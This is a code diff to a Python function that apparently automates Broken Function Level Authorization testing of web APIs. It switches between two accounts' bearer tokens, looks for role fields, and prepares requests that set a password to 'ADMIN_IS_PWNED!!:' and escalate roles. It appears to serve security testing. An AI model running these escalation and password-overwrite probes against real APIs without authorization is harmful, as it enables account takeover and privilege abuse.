@@ -59,6 +59,11 @@ def bfla(endpoints, accounts, url):
         "Authorization": f"Bearer {accountA.token}",
         "Content-Type": "application/json",
     }
+    if accountB:
+        headerB={
+            "Authorization": f"Bearer {accountB.token}",
+            "Content-Type": "application/json",
+        }
     # BFLA 
     for _,endpoint in bfla_candidates[:5]:
         
@@ -74,6 +79,10 @@ def bfla(endpoints, accounts, url):
         if body_is_required:
             PROPS = (endpoint.request_body and endpoint.request_body.properties) or {}  
             ATTRIBUTE = [property for property in PROPS if property] 
+            role_isThere=False
+            for elt in ATTRIBUTE:
+                if elt.lower() in ROLE_FIELDS:
+                    role_isThere= True
             valid_GET_endpoints = find_valid_GET_endpoints(ATTRIBUTE, endpoints) 
             if not valid_GET_endpoints:
                 target = None
@@ -92,14 +101,16 @@ def bfla(endpoints, accounts, url):
                     seg_tar[index_bd]=str(id)  
                     target_url='/'.join(seg_tar) 
                     get_url=url.rstrip('/') + '/' + target_url.lstrip('/') 
-                
-                response_bd = send_request('GET', get_url, headers) 
+                if role_isThere and method != 'DELETE':
+                    response_bd = send_request('GET', get_url, headers) 
+                else:
+                    headers=headerB
+                    response_bd = send_request('GET', get_url, headers)
                 body=safe_json(response_bd)
                 for a in ATTRIBUTE: 
                     exclude_values=[getattr(accountA,a,None), getattr(accountB,a,None)]
-                    
-                    
                     found_values['request_body'][a]=extract_field(body, [a],exclude=exclude_values) if (body is not None and response_bd.status_code == 200) else None # BUG check if the attribute isn't yours / {'video_name':'abc.mp4"} or {'role':'Customer','username':'Alice'}
+                    
                     
         if object_is_required:
             objs = findobj(endpoint) 
@@ -121,6 +132,10 @@ def bfla(endpoints, accounts, url):
                 if target and not  findobj(target):       
                     get_url = url.rstrip('/') + '/' + target.path.lstrip('/')   
                     response_obj = send_request('GET', get_url, headers)
+
+                    if extract_field(safe_json(response_obj),ROLE_FIELDS) and method == 'DELETE':
+                        headers=headerB
+                        response_obj=send_request('GET', get_url, headers)
                     body=safe_json(response_obj)
                     if body == '{}':
                         try:
@@ -164,7 +179,7 @@ def bfla(endpoints, accounts, url):
         for _,value in found_values.items():
             for element in value:
                 if element == 'password': 
-                    value[element]='ADMIN_IS_PWNED!!'
+                    value[element]='ADMIN_IS_PWNED!!:'
                 elif element in ROLE_FIELDS: 
                     for role in role_escalations:  
                         if role.capitalize() == value[element]:
